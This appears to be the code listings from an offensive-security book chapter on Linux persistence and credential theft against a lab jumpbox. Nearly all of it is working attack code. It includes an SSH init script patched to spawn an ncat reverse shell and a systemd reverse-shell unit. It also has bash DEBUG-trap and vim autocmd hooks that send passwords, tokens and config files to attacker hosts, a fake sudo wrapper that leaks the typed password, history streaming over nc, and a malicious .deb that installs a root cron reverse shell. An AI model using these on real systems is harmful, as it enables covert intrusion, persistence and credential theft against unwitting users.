["```\n# **root@p-jumpbox-01:/# ls -l /etc/init.d/**\n\ntotal 24\n-rwxr-xr-x 1 root root 1071 Feb  5  atd\n-rwxr-xr-x 1 root root 3062 Nov 14  cron\n-rwxr-xr-x 1 root root 3152 Jan 27  dbus\n-rwxr-xr-x 1 root root 1748 Nov 28  hwclock.sh\n-rwxr-xr-x 1 root root  959 Feb 25  procps\n-rwxr-xr-x 1 root root 4060 May 26 14:44 ssh \n```", "```\n# **cat /etc/init.d/ssh**\n\n#! /bin/sh\n`--snip--`\ncase \"$1\" in\n  start)\n    check_privsep_dir\n    check_for_no_start\n    check_dev_null\n    log_daemon_msg \"Starting OpenBSD Secure Shell server\" \"sshd\" || true\n    if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile /run/sshd.pid \\\n                         --exec /usr/sbin/sshd -- $SSHD_OPTS; then\n      log_end_msg 0 || true\n    else\n      log_end_msg 1 || true\n    fi\n    ;;\n  stop)\n    log_daemon_msg \"Stopping OpenBSD Secure Shell server\" \"sshd\" || true\n    if start-stop-daemon --stop --quiet --oknodo --pidfile /run/sshd.pid \\\n                         --exec /usr/sbin/sshd; then\n      log_end_msg 0 || true\n    else\n      log_end_msg 1 || true\n fi\n    ;;\n\n  reload|force-reload)\n    check_for_no_start\n    check_config\n    log_daemon_msg \"Reloading OpenBSD Secure Shell server's configuration\" \"sshd\" || true\n    if start-stop-daemon --stop --signal 1 --quiet --oknodo --pidfile /run/sshd.pid \\\n                         --exec /usr/sbin/sshd; then\n      log_end_msg 0 || true\n    else\n      log_end_msg 1 || true\n    fi\n    ;;\n`--snip--` \n```", "```\n# **/etc/init.d/ssh start**\n# **/etc/init.d/ssh stop**\n# **/etc/init.d/ssh reload**\n# **/etc/init.d/ssh force-reload** \n```", "```\n`--snip--`\nstart)\n  check_privsep_dir\n  check_for_no_start\n  check_dev_null\n  log_daemon_msg \"Starting OpenBSD Secure Shell server\" \"sshd\" || true\n  if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile\n/run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then\n    log_end_msg 0 || true\n  else\n    log_end_msg 1 || true\n  fi\n **ncat 172.16.10.1 4444 -e /bin/bash 2> /dev/null &**\n  ;;\n`--snip--` \n```", "```\n$ **pwncat-cs -l -p 4444**\n```", "```\n# **service ssh start**\n```", "```\n❶ [Unit]\nDescription=RevShell\nAfter=network-online.target\n❷ Wants=network-online.target\n\n[Service]\n❸ ExecStart=**ncat ATTACKER_IP 4444 -e /bin/bash**\n❹ Restart=always\n\n[Install]\nWantedBy=multi-user.target \n```", "```\nsession     optional     pam_exec.so seteuid /usr/local/bin/pam-helper.sh\n```", "```\n`type - control - module-path - module-arguments`\n```", "```\n$ **cat /home/nostarch/.ssh/authorized_keys**\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB9Rp0Lol7dmnNxiMSlcWXWp5Ruf4XLwo2fgR7ZD\ndjMNHIJtbmTXz4WLM34XagYaDFpqsghbE+kYM9HatmK7KY9HDTqC96fX0TW8ky8UChdSvB7oiQjEei\nCRuiqWqarPja6S8ko0LjdAe65n59kT2ClFCKP5XlGgkv/zMpLIfQxyrI4LFGun/Pi+Nef0DfNioBdZ\nlUAmWeOjHyJ+xdpHMdhJSHGuzNx0KRnzZ83mvhgXZAGcr7Pz1NMGxXhjx2TeQzV7Yek+Z2QY6LMFpQ\ne0c8AAvr/bI7+nj0wb27fhM66sOJp+VL+E4vg2t6TaGmrnq5JOG7lbIpXU/BU2KZaSx2E9bDzq5eOi\nAQc8j+WE6Y1Y7r/0pbZ5DuQHoowCzS6r9nX9NU0kI4W9mLQ1vx3mgOUu4eEDF579UX4CIj7nju8ebg\nwHhBaNdaYfmAz5TYgO4P92oqUNoyEm/eyndghpGWkn1U9yuzzCjiQqxpOV6V6Dw0DAyviHta5pYAjX\nCtsYM= \n```", "```\n$ **ssh-keygen -t rsa -C \"\"**\n```", "```\n$ **mkdir ~/.ssh && chmod 700 ~/.ssh**\n$ **touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys** \n```", "```\n$ **cat id_rsa.pub | ssh backup@172.16.10.13 'cat >> .ssh/authorized_keys'**\n```", "```\n$ **ssh-copy-id -i ~/.ssh/id_rsa.pub backup@172.16.10.13**\n```", "```\n$ **ssh backup@172.16.10.13 -i ~/.ssh/id_rsa**\n```", "```\n$ **grep lp /etc/passwd**\n\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin \n```", "```\n# **usermod -s /bin/bash lp**\n```", "```\n# **passwd lp**\n```", "```\n$ **ssh lp@172.16.10.13**\n```", "```\n$ **cat /etc/profile**\n\n# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))\n# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).\n\n`--snip--`\n❶ if [-d /etc/profile.d]; then\n❷ for i in /etc/profile.d/*.sh; do\n  ❸ if [-r $i]; then\n    ❹ . $i\n    fi\n  done\n  unset i\nfi \n```", "```\n$ **touch .profile**\n```", "```\n#!/bin/bash\n\n❶ hook() {\n  echo \"You executed ${BASH_COMMAND}\"\n}\n\n❷ trap 'hook' DEBUG \n```", "```\n$ **source .profile**\n```", "```\nbackup@p-jumpbox-01:~$ **id**\nYou executed id\nuid=34(backup) gid=34(backup) groups=34(backup)\n\nbackup@p-jumpbox-01:~$ **ps -ef**\nYou executed ps -ef\nUID  PID  PPID  C STIME TTY     TIME CMD\nroot   1     0  0 01:31 ?   00:00:00 /bin/sh -c service ssh restart  &&  service cron restar...\nroot  16     1  0 01:31 ?   00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups \n```", "```\n#!/bin/bash\n\nhook() {\n❶ case \"${BASH_COMMAND}\" in\n  ❷ mysql*)\n    ❸ if echo \"${BASH_COMMAND}\" | grep -- \"-p\\|--password\"; then\n        curl https://attacker.com \\\n              -H \"Content-Type:application/json\" \\\n              -d \"{\\\"command\\\":\\\"${BASH_COMMAND}\\\"}\" \\\n              --max-time 3 \\\n              --connect-timeout 3 \\\n              -s &> /dev/null\n      fi\n     ;;\n  ❹ curl*)\n    if echo \"${BASH_COMMAND}\" | grep -ie \"token\" \\\n                                     -ie \"apikey\" \\\n                                     -ie \"api_token\" \\\n                                     -ie \"bearer\" \\\n                                   ❺ -ie \"authorization\"; then\n      curl https://attacker.com \\\n              -H \"Content-Type:application/json\" \\\n              -d \"{\\\"command\\\":\\\"${BASH_COMMAND}\\\"}\" \\\n              --max-time 3 \\\n              --connect-timeout 3 \\\n              -s &> /dev/null\n    fi\n   ;;\n  esac\n}\n\n❻ trap 'hook' DEBUG \n```", "```\nautocmd BufWritePost *.conf,*.config :silent !timeout 3 curl -m 5 -s\nhttp://172.16.10.1:8080 -o /dev/null --data-binary @<afile> & \n```", "```\n$ **nc -lkvp 8080**\n\nlistening on [any] 8080 ... \n```", "```\n$ **vim.tiny /tmp/credentials.conf**\n\nUSER=nostarch\nPASS=press123 \n```", "```\nlistening on [any] 8080 ...\n172.16.10.13: inverse host lookup failed: Unknown host\nconnect to [172.16.10.1] from (UNKNOWN) [172.16.10.13] 42538\nPOST / HTTP/1.1\nHost: 172.16.10.1:8080\nUser-Agent: curl/7.88.1\nAccept: */*\nContent-Length: 29\nContent-Type: application/x-www-form-urlencoded\n\n**USER=nostarch**\n**PASS=press123** \n```", "```\nautocmd BufWritePost * :silent !timeout 1 curl -m 5 -s -o /dev/null\nhttp://172.16.10.1:8080 --data-binary @<afile> \n```", "```\nautocmd BufWritePost *.conf,*.config :silent !if grep \"PASSWORD\\|SECRET\\|APIKEY\" <afile>;\nthen timeout 3 curl -m 5 -s -o /dev/null http://172.16.10.1:8080\n--data-binary @<afile>; fi \n```", "```\n❶ export PROMPT_COMMAND=\"history -a; history -r; $PROMPT_COMMAND\"\n\n❷ if ! pgrep -u \"$(whoami)\" nc &> /dev/null; then\n❸ tail -F ~/.bash_history | nc 172.16.10.1 4444 &> /dev/null &\nfi \n```", "```\n$ **socat TCP4-LISTEN:4444,fork STDOUT**\n```", "```\n$ **ssh backup@172.16.10.13**\nbackup@172.16.10.13's password:\n\nbackup@p-jumpbox-01:~$ **id**\nuid=34(backup) gid=34(backup) groups=34(backup)\n\nbackup@p-jumpbox-01:~$ **whoami**\nbackup\n\nbackup@p-jumpbox-01:~$ **uptime**\n02:21:50 up 14 days, 12:32,  0 user,  load average: 0.60, 0.40, 0.23 \n```", "```\n$ **socat TCP4-LISTEN:4444,fork STDOUT**\n\nid\nwhoami\nuptime \n```", "```\n$ **touch /tmp/sudo && chmod +x /tmp/sudo**\n```", "```\nalias sudo='/tmp/sudo'\n```", "```\n#!/bin/bash\nARGS=\"$@\"\n\nleak_over_http() {\n  local encoded_password\n❶ encoded_password=$(echo \"${1}\" | base64 | sed s'/[=+/]//'g)\n  curl -m 5 -s -o /dev/null \"http://172.16.10.1:8080/${encoded_password}\"\n}\n\n❷ stty -echo\n❸ read -r -p \"[sudo] password for $(whoami): \" sudopassw\n\nleak_over_http \"${sudopassw}\"\n❹ stty echo\necho \"${sudopassw}\" | /usr/bin/sudo -p \"\" -S -k ${ARGS} \n```", "```\n$ **python -m http.server 8080**\n\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)... \n```", "```\n$ **sudo vi --help**\n\n[sudo] password for backup: \n```", "```\n172.16.10.13 - - [22:59:32] \"GET **/YmFja3VwCg** HTTP/1.1\" 404 -\n```", "```\n$ **dpkg --info example_amd64.deb**\n\nnew Debian package, version 2.0.\n size 784 bytes: control archive=420 bytes.\n     168 bytes,     6 lines      control\n      79 bytes,     3 lines   *  postinst             #!/bin/bash\n Package: example\n Version: 1.0.0\n Maintainer: Black Hat Bash (info@blackhatbash.com)\n Description: My awesome package\n Homepage: https://blackhatbash.com\n Architecture: all \n```", "```\n$ **strings example_amd64.deb**\n\n!<arch>\ndebian-binary   1694828481  0     0     100644  4\ncontrol.tar.xz  1694828481  0     0     100644  420\nYZdata.tar.xz   1694828481  0     0     100644  172\n`--snip--` \n```", "```\n$ **sudo dpkg -i example_amd64.deb**\n\nSelecting previously unselected package example.\n(Reading database ... 423743 files and directories currently installed.)\nPreparing to unpack example_amd64.deb ...\nUnpacking example (1.0.0) ...\nSetting up example (1.0.0) ...\n\n**I don't do anything other than echoing this to the screen!** \n```", "```\n$ **ar -v -x example_amd64.db**\n\nx - debian-binary\nx - control.tar.xz\nx - data.tar.xz \n```", "```\n$ **tar -xvf control.tar.xz**\n$ **tar -xvf data.tar.xz** \n```", "```\n$ **mkdir /tmp/example && cd /tmp/example**\n```", "```\n$ **mkdir DEBIAN**\n```", "```\nPackage: example\nVersion: 1.0.0\nMaintainer: Your Name\nDescription: Example\nHomepage: https://nostarch.com\nArchitecture: all \n```", "```\n$ **dpkg -b example example_amd64.deb**\n$ **ls -l**\n\ndrwxr-xr-x 3 kali kali 4096 Sep 17 20:33 example\n-rw-r--r-- 1 kali kali  684 Sep 17 21:22 example_amd64.deb \n```", "```\n$ **sudo alien -v -r bksh_amd64.deb --scripts**\n\n  dpkg-deb --info 'bksh_amd64.deb' control 2>/dev/null\n`--snip--`\n  dpkg-deb --info 'bksh_amd64.deb' preinst 2>/dev/null\n  dpkg-deb --info 'bksh_amd64.deb' prerm 2>/dev/null\n  mkdir bksh-1.0.0\n  chmod 755 bksh-1.0.0\n`--snip--`\nbksh-1.0.0-2.noarch.rpm generated \n```", "```\n$ **touch postinst postrm**\n$ **chmod 775 postinst postrm** \n```", "```\n$ **tree bksh**\n\nbksh\n└── DEBIAN\n     ├── control\n     ├── postinst\n     └── postrm\n\n2 directories, 3 files \n```", "```\n#!/bin/bash\n\nif ! grep -q \"4444\" /etc/crontab; then\n  echo \"* * * * * root nc 172.16.10.1 4444 -e /bin/bash\" >> /etc/crontab\nfi \n```", "```\n#!/bin/bash\n\nif ! grep -q \"4444\" /var/spool/cron/crontabs/root 2> /dev/null; then\n  echo \"* * * * * nc 172.16.10.1 4444 -e /bin/bash\" | crontab - -u root\nfi \n```", "```\n# **dpkg -i bksh_amd64.deb**\n```", "```\n$ **grep 4444 /etc/crontab**\n```"]